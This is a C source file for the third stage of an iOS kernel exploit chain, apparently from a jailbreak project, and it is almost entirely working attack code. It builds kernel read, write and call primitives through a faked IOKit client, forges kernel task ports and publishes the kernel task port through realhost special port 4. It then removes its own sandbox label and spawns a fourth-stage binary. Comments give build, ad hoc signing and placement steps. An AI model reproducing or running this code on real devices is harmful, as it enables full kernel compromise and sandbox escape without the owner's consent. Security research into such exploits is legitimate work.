#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <sys/syscall.h>

// compile with xcrun -sdk iphoneos clang -arch arm64 -shared -fno-stack-protector -fno-stack-check stage3.m -o stage3
// adhoc sign using jtool: ~/Work/stash/jtool_old_build/jtool --sign adhoc stage3 and then ~/Work/stash/jtool_old_build/jtool --sig out.bin to get the hash
// !!! out.bin is your signed stage3 binary now not stage3 so copy that one instead of stage3
// update the hash in stage2 at the top
// do the same for stage 4
// you can place stage 4 anywhere on the **root** FS but you have to update the path
// you also should be able to place stage 3 anywhere where racoons sbx has access to but just do /usr/sbin/racoon.dylib because I for sure know that this works

// a hell lot of type defs are ahead of you because we can't use any functions here
// this is basically the version of the exploit used in the app (minus the race part obv) just copy pasted into here and then I changed a few things so that it doesn't rely on cache functions
// so for a more readable version/to understand it please check the version under shared (pwn.m)

typedef uint64_t kptr_t;
typedef int kern_return_t;
typedef uint32_t mach_port_t;
typedef mach_port_t* mach_port_array_t;
typedef int vm_prot_t;
typedef uint64_t mach_vm_address_t;
typedef unsigned int mach_msg_type_number_t;
typedef uint32_t io_connect_t;
typedef uint32_t mach_port_name_t;
typedef mach_port_t task_t;
typedef mach_port_t vm_map_t;
typedef uint64_t mach_vm_size_t;
typedef uint64_t mach_msg_timeout_t;
typedef uint64_t mach_msg_size_t;
typedef uint32_t mach_msg_option_t;
typedef uint64_t mach_msg_return_t;
typedef uint64_t mach_vm_offset_t;
typedef uint32_t mach_port_right_t;
typedef bool boolean_t;
typedef mach_port_t ipc_space_t;
typedef unsigned int vm_inherit_t;
typedef uint64_t mach_port_poly_t; // ???
typedef uint32_t mach_msg_type_name_t;
typedef struct
{
    unsigned int msgh_bits;
    unsigned int msgh_size;
    unsigned int msgh_remote_port;
    unsigned int msgh_local_port;
    unsigned int msgh_reserved;
    int msgh_id;
} mach_msg_header_t;

#include "../shared/offsets.h"

typedef volatile struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
#ifdef __LP64__
        uint32_t pad;
#endif
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
#ifdef __LP64__
            uint32_t pad;
#endif
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;
    kptr_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;
typedef volatile union {
    struct {
        struct {
            kptr_t data;
            uint32_t reserved : 24,
                type : 8;
            uint32_t pad;
        } lock; // mutex lock
        uint32_t ref_count;
        uint32_t active;
        uint32_t halting;
        uint32_t pad;
        kptr_t map;
    } a;
} ktask_t;
typedef struct
{
    mach_msg_header_t head;
    uint64_t verification_key;
    char data[0];
    char padding[4];
} mach_msg_data_buffer_t;

void write(int fd, char* cbuf, int nbyte)
{
    // an an input it's a file descriptor set to STD_ERR 2
    // as an output this will be used for returning syscall return value;
    register int x0 __asm__("x0") = fd;
    // as an input string to write
    // as an output this will be used for returning syscall return value higher half (in this particular case 0)
    register char* x1 __asm__("x1") = cbuf;
    // string length
    register int x2 __asm__("x2") = nbyte;
    // syscall write is 4
    register int x16 __asm__("x16") = SYS_write; // user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte);

    // full variant using stack local variables for register x0,x1,x2,x16 input
    // syscall result collected in x0 & x1 using "semi" intrinsic assembler
    __asm__ volatile( // all args prepared, make the syscall
        "svc #0x80"
        : "=r"(x0), "=r"(x1) // mark x0 & x1 as syscall outputs
        : "r"(x0), "r"(x1), "r"(x2), "r"(x16) : // mark the inputs
        // inform the compiler we read the memory
        "memory",
        // inform the compiler we clobber carry flag (during the syscall itself)
        "cc");
}

#define STD_OUT 1
#define STD_ERR 2
#define LOG(str)                 \
    do {                         \
        char* buf = str "\n";    \
        size_t i = 0;            \
        while (buf[i++] != '\n') \
            ;                    \
        write(STD_ERR, buf, i);  \
    } while (0)

#define KERN_INVALID_ARGUMENT 2
#define KERN_FAILURE 1
#define KERN_SUCCESS 0

#define IO_BITS_ACTIVE 0x80000000
#define IOT_PORT 0
#define IKOT_NONE 0
#define IKOT_TASK 2
#define IKOT_IOKIT_CONNECT 29

#define pgsize 0x4000

#define VM_PROT_READ 0x1
#define VM_PROT_WRITE 0x2
#define VM_PROT_EXECUTE 0x3
#define VM_FLAGS_ANYWHERE 0x0001
#define VM_FLAGS_RETURN_DATA_ADDR 0x100000
#define VM_INHERIT_NONE 2

#define MACH_PORT_NULL 0
#define MACH_PORT_DEAD ((uint32_t)~0)
#define MACH_PORT_VALID(x) (((x) != MACH_PORT_NULL) && ((x) != MACH_PORT_DEAD))
#define MACH_MSG_TYPE_MAKE_SEND 20
#define MACH_PORT_RIGHT_RECEIVE 1
#define MACH_SEND_MSG 1
#define MACH_MSGH_BITS(remote, local) ((remote) | ((local) << 8))

// function that's used to place data of a userland buffer in kernel land
uint64_t send_buffer_to_kernel_stage3_implementation(offsets_t* offsets, void* fake_client, uint64_t kslide, mach_port_t the_one, uint64_t our_task_addr, mach_msg_data_buffer_t* buffer_msg, size_t msg_size);

#define spelunk(addr) ((zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff))
#define zonemap_fix_addr(addr) (spelunk(addr) < zm_hdr.start ? spelunk(addr) + 0x100000000 : spelunk(addr))

char* mach_error_string(kern_return_t err);

uint64_t kcall_raw(offsets_t* offsets, void* fake_client, uint64_t kslide, mach_port_name_t the_one, uint64_t addr, int n_args, ...)
{
    if (n_args > 7) {
        LOG("no more than 7 args you cheeky fuck");
        return KERN_INVALID_ARGUMENT;
    }

    va_list ap;
    va_start(ap, n_args);

    uint64_t args[7];
    for (int i = 0; i < 7; i++) {
        args[i] = 0;
    }
    for (int i = 0; i < n_args; i++) {
        args[i] = va_arg(ap, uint64_t);
    }

    // first arg must always have a value
    if (n_args == 0 || args[0] == 0x0) {
        args[0] = 0x1;
    }

    *(uint64_t*)(fake_client + 0x40) = args[0];
    *(uint64_t*)(fake_client + 0x48) = addr + kslide;

    return offsets->userland_funcs.IOConnectTrap6(the_one, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
}
#define kcall(addr, n_args, ...) kcall_raw(offsets, fake_client, kslide, the_one, addr, n_args, ##__VA_ARGS__)

void kreadbuf_raw(offsets_t* offsets, void* fake_client, uint64_t kslide, mach_port_name_t the_one, uint64_t addr, void* buf, size_t len)
{
    kcall(offsets->funcs.copyout, 3, addr, buf, len);
}

#define kreadbuf(addr, buf, len) kreadbuf_raw(offsets, fake_client, kslide, the_one, addr, buf, len)

uint32_t kread32_raw(offsets_t* offsets, void* fake_client, uint64_t kslide, mach_port_name_t the_one, uint64_t addr)
{
    uint32_t val = 0;
    kreadbuf(addr, &val, sizeof(val));
    return val;
}
#define kread32(addr) kread32_raw(offsets, fake_client, kslide, the_one, addr)

uint64_t kread64_raw(offsets_t* offsets, void* fake_client, uint64_t kslide, mach_port_name_t the_one, uint64_t addr)
{
    uint64_t val = 0;
    kreadbuf(addr, &val, sizeof(val));
    return val;
}
#define kread64(addr) kread64_raw(offsets, fake_client, kslide, the_one, addr)

void kwritebuf_raw(offsets_t* offsets, void* fake_client, uint64_t kslide, mach_port_name_t the_one, uint64_t addr, void* buf, size_t len)
{
    kcall(offsets->funcs.copyin, 3, buf, addr, len);
}
#define kwritebuf(addr, buf, len) kwritebuf_raw(offsets, fake_client, kslide, the_one, addr, buf, len)

void kwrite32_raw(offsets_t* offsets, void* fake_client, uint64_t kslide, mach_port_name_t the_one, uint64_t addr, uint32_t val)
{
    kwritebuf(addr, &val, sizeof(val));
}
#define kwrite32(addr, val) kwrite32_raw(offsets, fake_client, kslide, the_one, addr, val)

void kwrite64_raw(offsets_t* offsets, void* fake_client, uint64_t kslide, mach_port_name_t the_one, uint64_t addr, uint64_t val)
{
    kwritebuf(addr, &val, sizeof(val));
}
#define kwrite64(addr, val) kwrite64_raw(offsets, fake_client, kslide, the_one, addr, val)

void where_it_all_starts(kport_t* fakeport, void* fake_client, uint64_t ip_kobject_client_port_addr, uint64_t our_task_addr, uint64_t kslide, uint64_t the_one, offsets_t* offsets)
{
    mach_port_array_t maps = NULL;
    mach_msg_type_number_t maps_num = 0;
    kern_return_t ret = KERN_SUCCESS;

    char formatbuf[255];
    size_t len, i;
    unsigned char j = 0;
    uint64_t hex64;
    char *logstr, *fail, var = 0;

    uint64_t zone_map_addr, zm_size, kern_task_addr, kern_proc, curr_task, kernel_vm_map, ipc_space_kernel, zm_task_buf_addr, km_task_buf_addr, remap_start, remap_end, new_port, realhost, our_proc, our_ucred, our_label, pid;

    typedef volatile struct
    {
        kptr_t prev;
        kptr_t next;
        kptr_t start;
        kptr_t end;
    } kmap_hdr_t;

    kmap_hdr_t zm_hdr;

    uint64_t ptrs[2];

    size_t ktask_size;
    volatile char scratch_space[4096];

    mach_msg_data_buffer_t *zm_task_buf_msg, *km_task_buf_msg;
    ktask_t *zm_task_buf, *km_task_buf;

    mach_vm_address_t remap_addr = 0x0;
    vm_prot_t cur = 0x0, max = 0x0;

    mach_port_t kernel_task;

#define LOG_HEX32(str, hex)     \
    do {                        \
        logstr = str;           \
        hex64 = hex;            \
        goto log2_format_hex32; \
    } while (0)
#define LOG_HEX64(str, hex)     \
    do {                        \
        logstr = str;           \
        hex64 = hex;            \
        goto log2_format_hex64; \
    } while (0)
#define VERIFY_HEX64(reject, pass, hex) \
    do {                                \
        fail = reject "\n";             \
        logstr = pass;                  \
        hex64 = hex;                    \
        goto verify;                    \
    } while (0)
#define VERIFY_MACH(str)        \
    do {                        \
        logstr = str;           \
        goto mach_error_verify; \
    } while (0)

init_var:
    switch (var) {
    case 0:
        zone_map_addr = kread64(offsets->data.zone_map + kslide);
        VERIFY_HEX64("failed to get zone map addr", "[+] got zone map addr: ", zone_map_addr);

    case 1:
        for (int i = 0; i < sizeof(zm_hdr); i++) {
            *((char*)(((uint64_t)&zm_hdr) + i)) = 0x0;
        }

        // lck_rw_t = uintptr_t opaque[2] = unsigned long opaque[2]
        kreadbuf(zone_map_addr + (sizeof(unsigned long) * 2), (void*)&zm_hdr, sizeof(zm_hdr));
        zm_size = zm_hdr.end - zm_hdr.start;
        LOG_HEX64("zmap start: ", zm_hdr.start);

    case 2:
        LOG_HEX64("zmap end: ", zm_hdr.end);

    case 3:
        LOG_HEX64("zmap size: ", zm_size);

    case 4:
        if (zm_size > 0x100000000) {
            LOG("zonemap too large :/");
            ret = KERN_FAILURE;
            goto out;
        }

        kern_task_addr = kread64(offsets->data.kernel_task + kslide);
        VERIFY_HEX64("failed to read kern_task_addr!", "[+] kern_task_addr: ", kern_task_addr);

    case 5:
        kern_proc = zonemap_fix_addr(kcall(offsets->funcs.get_bsdtask_info, 1, kern_task_addr));
        VERIFY_HEX64("failed to read kern_proc!", "[+] got kernproc: ", kern_proc);

    case 6:
        curr_task = zonemap_fix_addr(kcall(offsets->funcs.current_task, 0));
        VERIFY_HEX64("failed to get curr_task!", "[+] curr task: ", curr_task);

    case 7:
        kernel_vm_map = kread64(kern_task_addr + 0x20);
        VERIFY_HEX64("failed to read kernel_vm_map!", "got kernel vm map: ", kernel_vm_map);

    case 8:
        ipc_space_kernel = kread64(ip_kobject_client_port_addr + offsetof(kport_t, ip_receiver));
        VERIFY_HEX64("failed to read ipc_space_kernel!", "ipc_space_kernel: ", ipc_space_kernel);

    case 9:
        ptrs[0] = 0;
        ptrs[1] = 0;
        ptrs[0] = zonemap_fix_addr(kcall(offsets->funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
        ptrs[1] = zonemap_fix_addr(kcall(offsets->funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
        LOG_HEX64("zm_port addr: ", ptrs[0]);

    case 10:
        formatbuf[0] = 'k';
        hex64 = ptrs[1];
        len -= 19;
        goto log2_hex64_jump;

    case 11:
        ktask_size = offsets->struct_offsets.sizeof_task;
        if (ktask_size > 2048) {
            LOG("Buffer too small");
            ret = KERN_FAILURE;
            goto out;
        }
        zm_task_buf_msg = (mach_msg_data_buffer_t*)&scratch_space[0];
        for (int i = 0; i < 4096; i++) {
            scratch_space[i] = 0x0;
        }
        zm_task_buf_msg->verification_key = 0x4242424243434343;
        zm_task_buf = (ktask_t*)(&zm_task_buf_msg->data[0]);

        zm_task_buf->a.lock.data = 0x0;
        zm_task_buf->a.lock.type = 0x22;
        zm_task_buf->a.ref_count = 100;
        zm_task_buf->a.active = 1;
        *(kptr_t*)((uint64_t)zm_task_buf + offsets->struct_offsets.task_itk_self) = 1;
        zm_task_buf->a.map = zone_map_addr;

        km_task_buf_msg = (mach_msg_data_buffer_t*)(((uint64_t)&scratch_space[0]) + 2048);
        // duplicate the message
        for (int i = 0; i < ktask_size; i++) {
            scratch_space[i + 2048] = scratch_space[i];
        }

        km_task_buf_msg->verification_key = 0x4343434344444444;
        km_task_buf = (ktask_t*)(&km_task_buf_msg->data[0]);
        km_task_buf->a.map = kernel_vm_map;

        zm_task_buf_addr = send_buffer_to_kernel_stage3_implementation(offsets, fake_client, kslide, the_one, our_task_addr, zm_task_buf_msg, ktask_size);
        VERIFY_HEX64("failed to get zm_task_buf_addr!", "zm_task_buf_addr: ", zm_task_buf_addr);

    case 12:
        km_task_buf_addr = send_buffer_to_kernel_stage3_implementation(offsets, fake_client, kslide, the_one, our_task_addr, km_task_buf_msg, ktask_size);
        VERIFY_HEX64("failed to get km_task_buf_addr!", "km_task_buf_addr: ", km_task_buf_addr);

    case 13:
        kcall(offsets->funcs.ipc_kobject_set, 3, ptrs[0], (uint64_t)zm_task_buf, IKOT_TASK);
        kcall(offsets->funcs.ipc_kobject_set, 3, ptrs[1], (uint64_t)km_task_buf, IKOT_TASK);

        kwrite64(curr_task + offsets->struct_offsets.itk_registered + 0x0, ptrs[0]);
        kwrite64(curr_task + offsets->struct_offsets.itk_registered + 0x8, ptrs[1]);

        ret = offsets->userland_funcs.mach_ports_lookup(offsets->userland_funcs.mach_task_self(), maps, &maps_num);
        VERIFY_MACH("failed to lookup mach ports: ");

    case 14:
        LOG_HEX32("zone_map port: ", maps[0]);

    case 15:
        LOG_HEX32("kernel_map port: ", maps[1]);

    case 16:
        if (!MACH_PORT_VALID(maps[0]) || !MACH_PORT_VALID(maps[1])) {
            LOG("invalid zone/kernel map ports");
            ret = KERN_FAILURE;
            goto out;
        }

        ptrs[0] = ptrs[1] = 0x0;

        kwrite64(curr_task + offsets->struct_offsets.itk_registered + 0x0, 0x0);
        kwrite64(curr_task + offsets->struct_offsets.itk_registered + 0x8, 0x0);

        LOG_HEX64("kern_task_addr: ", kern_task_addr);

    case 17:
        // setup kernel base and slide for post
        kwrite64(kern_task_addr + offsets->struct_offsets.task_all_image_info_addr, offsets->constant.kernel_image_base + kslide);
        kwrite64(kern_task_addr + offsets->struct_offsets.task_all_image_info_size, kslide);

        ret = offsets->userland_funcs.mach_vm_remap(maps[1], &remap_addr, offsets->struct_offsets.sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kern_task_addr, false, &cur, &max, VM_INHERIT_NONE);
        VERIFY_MACH("mach_vm_remap failed: ");

    case 18:
        LOG_HEX64("[+] remap addr: ", remap_addr);

    case 19:
        offsets->userland_funcs.mach_port_destroy(offsets->userland_funcs.mach_task_self(), maps[0]);
        offsets->userland_funcs.mach_port_destroy(offsets->userland_funcs.mach_task_self(), maps[1]);

        // remap must cover the entire struct and be page aligned
        remap_start = remap_addr & ~(pgsize - 1);
        remap_end = (remap_addr + offsets->struct_offsets.sizeof_task + pgsize) & ~(pgsize - 1);

        // kern_return_t vm_map_wire_external(vm_map_t map, vm_map_offset_t start, vm_map_offset_t end, vm_prot_t caller_prot, boolean_t user_wire)
        ret = kcall(offsets->funcs.vm_map_wire_external, 5, kernel_vm_map, remap_start, remap_end, VM_PROT_READ | VM_PROT_WRITE, false);
        VERIFY_MACH("failed to kcall vm_map_wire_external: ");

    case 20:
        new_port = zonemap_fix_addr(kcall(offsets->funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
        LOG_HEX64("new_port: ", new_port);

    case 21:
        kcall(offsets->funcs.ipc_kobject_set, 3, new_port, remap_addr, IKOT_TASK);
        kcall(offsets->funcs.ipc_port_make_send, 1, new_port);

        realhost = offsets->data.realhost + kslide;
        LOG_HEX64("[!] realhost: ", realhost);

    case 22:
        // realhost->special[4]
        kwrite64(realhost + 0x10 + (sizeof(uint64_t) * 4), new_port);
        LOG("registered realhost->special[4]");

        // zero out old ports before overwriting
        for (int i = 0; i < 3; i++) {
            kwrite64(curr_task + offsets->struct_offsets.itk_registered + (i * 0x8), 0x0);
        }

        kwrite64(curr_task + offsets->struct_offsets.itk_registered, new_port);
        LOG_HEX64("wrote new port: ", new_port);

    case 23:
        ret = offsets->userland_funcs.mach_ports_lookup(offsets->userland_funcs.mach_task_self(), maps, &maps_num);
        VERIFY_MACH("failed to lookup mach ports: ");

    case 24:
        kernel_task = maps[0];
        if (!MACH_PORT_VALID(kernel_task)) {
            LOG("kernel_task is invalid");
            ret = KERN_FAILURE;
            goto out;
        }
        LOG_HEX32("got kernel task port: ", kernel_task);

    case 25:
        // we have the task address in our_task_addr
        // now we need to read back bsd_info and then go from there to ucread and zero cr_label->p_perpolicy[1]
        our_proc = zonemap_fix_addr(kcall(offsets->funcs.get_bsdtask_info, 1, our_task_addr));
        our_ucred = kread64(our_proc + 0x100);
        our_label = kread64(our_ucred + 0x78);
        kwrite64(our_label + 0x10, 0x0);

        // spawn the other bin
        offsets->userland_funcs.posix_spawn(pid, "/mystuff/stage4", NULL, NULL, NULL, NULL);

        LOG("finally spawned stage 4 what a ride");
        // fallthrough, we want to exit now

    case 26:
        goto out;

    default:
        ret = KERN_FAILURE;
        hex64 = var;
        var = 25; // success case so it's incremented to out
        logstr = "Entered impossible state: ";
        goto log2_format_hex32;
    }

#undef LOG_HEX32
#undef LOG_HEX64
#undef VERIFY_HEX64
#undef VERIFY_MACH

verify:
    if (hex64 == 0x0) {
        ret = KERN_FAILURE;
        write(STD_ERR, fail, len);
        goto out;
    }

log2_format_hex64:
    len = -1;
    while (logstr[++len] != '\0')
        formatbuf[len] = logstr[len];
    formatbuf[len + 0] = '0';
    formatbuf[len + 1] = 'x';
    formatbuf[len + 18] = '\n';
    formatbuf[len + 19] = '\0';

log2_hex64_jump:
    for (i = 2; i < 18; ++i) {
        j = ((hex64 >> (4 * (17 - i))) & 0xf);
        formatbuf[len + i] = j + '0';
        if (j > 9)
            formatbuf[len + i] += ('a' - '9' - 1);
    }
    len += 19;
    goto log_internal;

log2_format_hex32:
    len = -1;
    while (logstr[++len] != '\0')
        formatbuf[len] = logstr[len];
    formatbuf[len + 0] = '0';
    formatbuf[len + 1] = 'x';
    formatbuf[len + 10] = '\n';
    formatbuf[len + 11] = '\0';
    for (i = 2; i < 10; ++i) {
        j = ((hex64 >> (4 * (9 - i))) & 0xf);
        formatbuf[len + i] = j + '0';
        if (j > 9)
            formatbuf[len + i] += ('a' - '9' - 1);
    }
    len += 11;
    goto log_internal;

mach_error_verify:
    if (ret == KERN_SUCCESS) {
        ++var;
        goto init_var;
    }

    len = -1;
    while (logstr[++len] != '\0')
        formatbuf[len] = logstr[len];
    formatbuf[len + 0] = '0';
    formatbuf[len + 1] = 'x';
    formatbuf[len + 10] = ' ';
    formatbuf[len + 11] = '(';
    for (i = 2; i < 10; ++i) {
        j = ((ret >> (4 * (9 - i))) & 0xf);
        formatbuf[len + i] = j + '0';
        if (j > 9)
            formatbuf[len + i] += ('a' - '9' - 1);
    }
    len += 11;
    i = -1;
    logstr = mach_error_string((kern_return_t)ret);
    while (logstr[len + (++i)] != '\0')
        formatbuf[len + i] = logstr[i];
    len += (i + 2);
    formatbuf[len - 2] = ')';
    formatbuf[len - 1] = '\n';
    formatbuf[len] = '\0';
    ret = KERN_FAILURE;

log_internal:
    write(STD_ERR, formatbuf, len);

    if (ret == KERN_SUCCESS) {
        ++var;
        goto init_var;
    }

out:
    fakeport->ip_bits = 0x0;
    fakeport->ip_kobject = 0x0;
    offsets->userland_funcs.mach_port_deallocate(offsets->userland_funcs.mach_task_self(), the_one);

    // spin for now
    // while (1) {}

    // exit call
    __asm__(
        "movz x0, 0x0\n" // return 0
        "movz x16, 0x1\n" // void exit(int rval)
        "svc 0x80");
}

// kinda messy function signature
uint64_t send_buffer_to_kernel_stage3_implementation(offsets_t* offsets, void* fake_client, uint64_t kslide, mach_port_t the_one, uint64_t our_task_addr, mach_msg_data_buffer_t* buffer_msg, size_t msg_size)
{
    char formatbuf[255];
    char hex64buf[19];
    kern_return_t ret = KERN_SUCCESS;

    buffer_msg->head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    buffer_msg->head.msgh_local_port = MACH_PORT_NULL;
    buffer_msg->head.msgh_size = msg_size;

    mach_port_t port;

    uint64_t itk_registered, messages, header, key_address, kernel_key;
    uint16_t msg_count;

    uint64_t hex64;
    size_t len, i;
    unsigned char j = 0;
    char *logstr, var = 0;
    bool errbit = false;

#define ERR_32(str, hex) \
    do {                 \
        errbit = true;   \
        logstr = str;    \
        hex64 = hex;     \
        goto log_hex32;  \
    } while (0)
#define ERR_64(str, hex) \
    do {                 \
        errbit = true;   \
        logstr = str;    \
        hex64 = hex;     \
        goto log_hex32;  \
    } while (0)
#define HEX_32(str, hex) \
    do {                 \
        logstr = str;    \
        hex64 = hex;     \
        goto log_hex32;  \
    } while (0)
#define HEX_64(str, hex) \
    do {                 \
        logstr = str;    \
        hex64 = hex;     \
        goto log_hex32;  \
    } while (0)
#define VERIFY_MACH(str)   \
    do {                   \
        logstr = str;      \
        goto log_err_mach; \
    } while (0)

var_loop:
    switch (var) {
    case 0:
        ret = offsets->userland_funcs.mach_port_allocate(offsets->userland_funcs.mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
        if (ret != KERN_SUCCESS)
            ERR_32("failed to allocate mach port: ", ret);

        HEX_32("got port: ", port);

    case 1:
        ret = offsets->userland_funcs.mach_port_insert_right(offsets->userland_funcs.mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
        if (ret != KERN_SUCCESS)
            ERR_32("failed to insert send right: ", ret);

        ret = offsets->userland_funcs.mach_ports_register(offsets->userland_funcs.mach_task_self(), &port, 1);
        if (ret != KERN_SUCCESS)
            ERR_32("failed to register mach port: ", ret);

        buffer_msg->head.msgh_remote_port = port;

        ret = offsets->userland_funcs.mach_msg(&buffer_msg->head, MACH_SEND_MSG, buffer_msg->head.msgh_size, 0, 0, 0, 0);
        VERIFY_MACH("failed to send mach message: ");

    case 2:
        itk_registered = kread64(our_task_addr + offsets->struct_offsets.itk_registered);
        if (itk_registered == 0x0) {
            LOG("failed to read our_task_addr->itk_registered!");
            goto err;
        }

        HEX_64("itk_registered: ", itk_registered);

    case 3:
        msg_count = kread64(itk_registered + offsetof(kport_t, ip_messages.port.msgcount)) & 0xffff;
        if (msg_count != 1)
            ERR_32("got weird msgcount! expected 1 but got: ", msg_count);

        HEX_32("msg_count: ", msg_count);

    case 4:
        messages = kread64(itk_registered + offsetof(kport_t, ip_messages.port.messages));
        if (messages == 0x0) {
            LOG("unable to find ip_messages.port.messages in kernel port!");
            goto err;
        }

        HEX_64("messages: ", messages);

    case 5:
        header = kread64(messages + 0x18); // ipc_kmsg->ikm_header
        if (header == 0x0) {
            LOG("unable to find ipc_kmsg->ikm_header");
            goto err;
        }

        HEX_64("header: ", header);

    case 6:
        key_address = header + 0x20; // ikm_header->verification_key (in the msg body)

        HEX_64("key_address: ", key_address);

    case 7:
        kernel_key = kread64(key_address);
        if (kernel_key != buffer_msg->verification_key) {
            HEX_64("kernel verification key did not match! found wrong kmsg? expected: ", buffer_msg->verification_key);
            ERR_64("got: ", kernel_key);
        }

        ret = offsets->userland_funcs.mach_ports_register(offsets->userland_funcs.mach_task_self(), NULL, 0);
        if (ret != KERN_SUCCESS)
            ERR_32("failed to call mach_ports_register: ", ret);

        return key_address + sizeof(kernel_key);

    default:
        goto err;
    }

#undef ERR_32
#undef ERR_64
#undef HEX_32
#undef HEX_64
#undef VERIFY_MACH

log_hex32:
    len = -1;
    while (logstr[++len] != '\0')
        formatbuf[len] = logstr[len];
    formatbuf[len + 0] = '0';
    formatbuf[len + 1] = 'x';
    formatbuf[len + 10] = '\n';
    formatbuf[len + 11] = '\0';
    for (i = 2; i < 10; ++i) {
        j = ((hex64 >> (4 * (9 - i))) & 0xf);
        formatbuf[len + i] = j + '0';
        if (j > 9)
            formatbuf[len + i] += ('a' - '9' - 1);
    }
    len += 11;
    goto log_write;

log_hex64:
    len = -1;
    while (logstr[++len] != '\0')
        formatbuf[len] = logstr[len];
    formatbuf[len + 0] = '0';
    formatbuf[len + 1] = 'x';
    formatbuf[len + 18] = '\n';
    formatbuf[len + 19] = '\0';
    for (i = 2; i < 18; ++i) {
        j = ((hex64 >> (4 * (17 - i))) & 0xf);
        formatbuf[len + i] = j + '0';
        if (j > 9)
            formatbuf[len + i] += ('a' - '9' - 1);
    }
    len += 19;
    goto log_write;

log_err_mach:
    if (ret == KERN_SUCCESS) {
        ++var;
        goto var_loop;
    }

    len = -1;
    while (logstr[++len] != '\0')
        formatbuf[len] = logstr[len];
    formatbuf[len + 0] = '0';
    formatbuf[len + 1] = 'x';
    formatbuf[len + 10] = ' ';
    formatbuf[len + 11] = '(';
    for (i = 2; i < 10; ++i) {
        j = ((ret >> (4 * (9 - i))) & 0xf);
        formatbuf[len + i] = j + '0';
        if (j > 9)
            formatbuf[len + i] += ('a' - '9' - 1);
    }
    len += 11;
    i = -1;
    logstr = mach_error_string((kern_return_t)ret);
    while (logstr[len + (++i)] != '\0')
        formatbuf[len + i] = logstr[i];
    len += (i + 2);
    formatbuf[len - 2] = ')';
    formatbuf[len - 1] = '\n';
    formatbuf[len] = '\0';
    errbit = true;

log_write:
    write(STD_ERR, formatbuf, len);

    if (!errbit) {
        ++var;
        goto var_loop;
    }

err:
    return 0x0;
}
